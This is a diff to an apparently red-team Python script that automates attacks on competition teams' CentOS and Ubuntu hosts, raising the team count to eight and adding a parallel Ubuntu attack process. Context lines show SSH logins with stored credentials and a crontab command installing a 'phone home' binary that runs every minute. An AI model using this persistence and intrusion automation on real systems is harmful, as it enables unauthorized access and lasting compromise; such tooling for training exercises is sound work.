@@ -32,7 +32,7 @@ def main():
     last_octet['centos'] = 11
     last_octet['pfsense'] = 2
 
-    teams_numbers = range(1,3)
+    teams_numbers = range(1,9)
     teams = []
 
     for i in teams_numbers:
@@ -48,7 +48,8 @@ def main():
         e_process.start()
         e_process = multiprocessing.Process(target=centos_attacks, args=[team.centos])
         e_process.start()
-    
+        e_process = multiprocessing.Process(target=ubuntu_attacks, args=[team.ubuntu])
+        e_process.start()
         #universal_linux_attack(team.ubuntu)
         print(team.centos.ip)
         #universal_linux_attack(team.centos)
@@ -297,7 +298,7 @@ def ubuntu_attacks(host):
 def centos_attacks(host):
     server_ip = "10.0.0.101"
     ssh = pxssh.pxssh()
-    
+
     try:
         ssh.login(host.ip, host.username, password=host.password)
     except Exception as e:
@@ -336,7 +337,7 @@ def centos_attacks(host):
     ## Chown phone home
     phonehome_crontab_cmd = r'(crontab -l 2>/dev/null; echo "* * * * * /usr/bin/etph") | crontab -'
     log_line("Setting crontab on /usr/bin/etph on {}".format(host.ip), host, print_flag=True)
-    ssh.sendline(phonehome_crontab_cmd)
+    ssh.sendline(phonehome_crontab_cmd) 
     ssh.prompt()
     log_line(ssh.before.decode('utf8'), host)
     
